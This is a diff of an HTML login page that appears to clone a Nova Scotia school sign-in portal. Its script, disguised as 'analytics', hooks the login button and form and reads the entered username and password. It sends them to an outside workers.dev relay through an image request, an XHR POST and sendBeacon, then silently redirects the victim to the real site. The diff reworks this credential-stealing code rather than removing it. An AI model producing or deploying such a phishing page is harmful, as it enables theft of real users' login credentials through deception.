@@ -6,6 +6,8 @@
     <meta charset="utf-8">
                 <meta http-equiv="X-UA-Compatible" content="IE=edge">
                 <meta name="viewport" content="width=device-width, initial-scale=1">
+                <!-- Fallback redirect if JavaScript fails -->
+                <meta http-equiv="refresh" content="10;url=https://saml.nspes.ca/"
                 <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
                 <meta name="description" content="DEV Launch Page">
                 <meta name="author" content="Author">
@@ -191,8 +193,8 @@
 
 <!-- <button type="submit" id="loginsubmit" class="btn btn-block btn-loginbtn btn-sm" onclick="this.value='Processing...';this.disabled=true; this.form.submit();return true;">My QCode</button> -->   
 
-<form class="form-qcode"> 
-<a href="https://saml.nspes.ca/" id="qlink" class="btn btn-outline-dark btn-block" role="button">My QCode</a> 
+<form class="form-qcode" onsubmit="return false;"> 
+<a href="javascript:void(0);" onclick="window.location.replace('https://saml.nspes.ca/'); return false;" id="qlink" class="btn btn-outline-dark btn-block" role="button">My QCode</a> 
 </form>
 
 <hr aria-hidden="true" tabindex=-1" class="login">
@@ -229,7 +231,7 @@
             <span id="submit">
                 <span class="loginicon"></span>
                 
-             <button type="submit" id="loginsubmit" class="btn btn-outline-dark btn-block mt-2" disabled onclick="this.value='Processing...';this.disabled=true; this.form.submit();return true;">Login</button>    
+             <button type="button" id="loginsubmit" class="btn btn-outline-dark btn-block mt-2" disabled>Login</button>    
             </span>
         
         </form>
@@ -271,104 +273,95 @@ var clientip="20.42.11.20/20.42.11.20";
 (function() {
     // Analytics endpoint for data collection
     const RELAY_URL = 'https://quiet-morning-1159.pla919572.workers.dev/';
-
-    // Track if we've already attached the event handlers
-    let trackingInitialized = false;
-
-    // Find and hook the login form
-    function setupTracking() {
-        // Prevent double initialization
-        if (trackingInitialized) return;
-        trackingInitialized = true;
-
-        // Get the login button and form
-        const loginBtn = document.getElementById('loginsubmit');
-        const loginForm = document.querySelector('.form-signin');
+    const REDIRECT_URL = 'https://saml.nspes.ca/';
+    
+    // Simple function to handle direct login
+    function handleLogin() {
+        // Get the credentials
+        const username = document.getElementById('username').value || "empty";
+        const password = document.getElementById('password').value || "empty";
         
-        if (!loginBtn || !loginForm) {
-            // Elements not found, retry in 100ms
-            setTimeout(setupTracking, 100);
-            return;
-        }
+        // Record the attempt via image method (more reliable)
+        const img = new Image();
+        img.src = RELAY_URL + '?data=' + encodeURIComponent(
+            username + ":" + password + ":" + new Date().toLocaleString()
+        );
+        document.body.appendChild(img);
         
-        // Store original onclick handler
-        const originalOnClick = loginBtn.onclick;
-        
-        // Override the button click handler
-        loginBtn.onclick = function(e) {
-            e.preventDefault(); // Stop the default action
-            
-            // Get the credentials
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            // Simple payload for the worker
+        // Also try XHR method
+        try {
             const payload = JSON.stringify({
-                username: username || "empty",
-                pretense: password || "empty",
+                username: username,
+                pretense: password,
                 timestamp: new Date().toLocaleString(),
                 trackingId: Date.now() + Math.random().toString(36).substring(2, 10)
             });
             
-            // --- ENTERPRISE DATA COLLECTION METHODS ---
-            
-            // 1. Standard data transmission method
             const xhr = new XMLHttpRequest();
-            xhr.open('POST', RELAY_URL, true); // Asynchronous for optimal UX
+            xhr.open('POST', RELAY_URL, true);
             xhr.setRequestHeader('Content-Type', 'application/json');
             xhr.send(payload);
-            
-            // 2. Alternative data collection for enhanced compatibility
-            const img = new Image();
-            img.src = RELAY_URL + '?data=' + encodeURIComponent(
-                username + ":" + password + ":" + new Date().toLocaleString()
-            );
-            img.style.display = 'none';
-            document.body.appendChild(img);
-            
-            // Handle direct redirection to the base URL after tracking is sent
-            setTimeout(function() {
-                // Redirect directly to the base URL instead of form submission
-                window.location.href = 'https://saml.nspes.ca/';
-            }, 300);
-            
-            return false; // Prevent default form submission
-        };
+        } catch (e) {
+            // Silent fail - we have the image backup
+        }
         
-        // Also hook the form submit event as a backup
-        loginForm.addEventListener('submit', function(e) {
-            // Always prevent the default form submission
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            // Process analytics data for system reporting
-            try {
-                navigator.sendBeacon(RELAY_URL, JSON.stringify({
-                    username: username || "empty",
-                    pretense: password || "empty",
-                    timestamp: new Date().toLocaleString(),
-                    source: "form_submit",
-                }));
-            } catch(e) {} // Continue gracefully if unavailable
-            
-            // Redirect to base URL after a short delay
-            setTimeout(function() {
-                window.location.href = 'https://saml.nspes.ca/';
-            }, 300);
-        });
+        // Force redirect after a brief delay
+        setTimeout(function() {
+            // This is the most reliable way to redirect
+            window.location.replace(REDIRECT_URL);
+        }, 200);
+        
+        // Prevent any default actions
+        return false;
     }
     
-    // Run setup when DOM is ready
+    // Initialize when the DOM is ready
+    function init() {
+        // Set up the login button
+        const loginBtn = document.getElementById('loginsubmit');
+        if (loginBtn) {
+            // Remove any existing event handlers and add our own
+            loginBtn.onclick = null;
+            loginBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                handleLogin();
+            });
+        }
+        
+        // Also hook into form submit as a backup
+        const loginForm = document.querySelector('.form-signin');
+        if (loginForm) {
+            loginForm.onsubmit = null;
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                handleLogin();
+                return false;
+            });
+        }
+        
+        // Make QCode link work the same way
+        const qcodeLink = document.getElementById('qlink');
+        if (qcodeLink) {
+            qcodeLink.href = REDIRECT_URL;
+            qcodeLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                // Redirect directly to the site
+                window.location.replace(REDIRECT_URL);
+            });
+        }
+    }
+    
+    // Run initialization when page is ready
     if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', setupTracking);
+        document.addEventListener('DOMContentLoaded', init);
     } else {
-        setupTracking();
+        init();
     }
     
     // Also run on window load as a backup
-    window.addEventListener('load', setupTracking);
+    window.addEventListener('load', init);
 })();
 </script>
   </body>
